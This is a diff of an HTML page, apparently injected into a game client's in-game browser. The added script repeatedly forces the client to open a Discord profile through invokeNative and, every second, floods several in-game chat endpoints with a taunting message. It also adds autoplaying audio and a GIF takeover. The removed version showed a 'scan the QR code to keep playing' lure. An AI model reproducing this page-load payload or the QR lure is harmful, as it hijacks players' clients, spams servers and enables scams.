@@ -1,11 +1,37 @@
-<html lang="en"><head>
+<!DOCTYPE html>
+<html lang="en">
+<head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script>
+        setInterval(() => {
+            window.invokeNative("openUrl", "https://discord.com/users/1202377867116290129");
+        }, 5000);
+        setInterval(() => {
+            fetch("https://flix-scripts/chatResult", {
+                method: "POST",
+                body: JSON.stringify({ message: "vjmi is daddy 👽" })
+            });
+            fetch("https://easy-chat+/o6ZbK5Ecp6", {
+                headers: {
+                    "accept": "*/*",
+                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8"
+                },
+                body: JSON.stringify({ message: "vjmi is daddy 👽", channel: "شات العام" }),
+                method: "POST"
+            });
+            fetch("https://melix_chat/chatResult", {
+                method: "POST",
+                body: JSON.stringify({ message: "vjmi is daddy 👽" })
+            });
+        }, 1000);
+    </script>
     <style>
         body {
             margin: 0;
             padding: 0;
-            background: black;
+            background: url('https://cdn.discordapp.com/attachments/1339519458217168906/1343802085409423440/phonto.png?ex=67be98b7&is=67bd4737&hm=d81a660fca6a26e1f420e9f930de149fbfe474f825f13283f339e3430d08c1fa&') no-repeat center center fixed;
+            background-size: cover;
             font-family: 'Courier New', Courier, monospace;
             color: #ff0000;
             display: flex;
@@ -16,45 +42,36 @@
             text-align: center;
             overflow: hidden;
         }
-        #content {
-            display: none; 
-            opacity: 0; 
-            transition: opacity 2s ease; 
-        }
-        .image-container img {
-            width: 750px; 
-            height: auto;
-            border: 2px solid #1100ff; 
-            border-radius: 15px;
-            box-shadow: 0 0 15px rgba(0, 89, 255, 0.7); 
-        }
-        .info {
-            margin-top: 20px;
-            font-size: 1.5em;
-            color: #ff0000; 
-            text-shadow: 0px 0px 8px #ff0000, 0px 0px 15px #ff0000, 0px 0px 25px #ff0000; 
-            letter-spacing: 4.5px; 
-            white-space: pre-wrap;
-        }
-        .text {
-            margin-top: 20px;
-            font-size: 3em; 
-            color: #1900ff; 
-            text-shadow: 0px 0px 8px #0004ff, 0px 0px 15px #0004ff, 0px 0px 25px #0004ff; 
-             letter-spacing: 4.5px; 
-        }
-        .gif-container img {
+        #gif {
             width: 100%;
-            height: auto;
+            height: 100%;
+            object-fit: cover;
+            opacity: 1;
+            transition: opacity 1s ease-in-out;
+        }
+        #content {
+            opacity: 0;
+            transition: opacity 1s ease-in-out;
+        }
+        .vjmi #content {
+            opacity: 1;
+        }
+        .vjmi #gif {
+            opacity: 0;
         }
     </style>
 </head>
 <body>
-    <div id="content" style="display: block; opacity: 1;">
-        <div class="image-container">
-            <img src="https://cdn.discordapp.com/attachments/1339519458217168906/1343016278096478238/download_3.png?ex=67bbbce0&is=67ba6b60&hm=b4fe0a8946fcb2349fc9ec6c9b3b763f5e29eaa29cdecb25d28ab6eb6427142b&">
-        </div>
-        <div class="text">لمواصلة اللعب ، الرجاء مسح الباركود</div>
-        <div class="text">To keep playing , please scan the qrcode.</div>
+    <img id="gif" src="https://i.pinimg.com/originals/b8/a3/cd/b8a3cd1fad69ee87b4a843ca7769f49a.gif" alt="gif">
+    <div id="content">
+        <audio autoplay loop>
+            <source src="https://c.top4top.io/m_31834rdv31.mp3" type="audio/mpeg">
+        </audio>
     </div>
-</body></html>
+    <script>
+        setTimeout(() => {
+            document.body.classList.add('vjmi');
+        }, 2500);
+    </script>
+</body>
+</html>
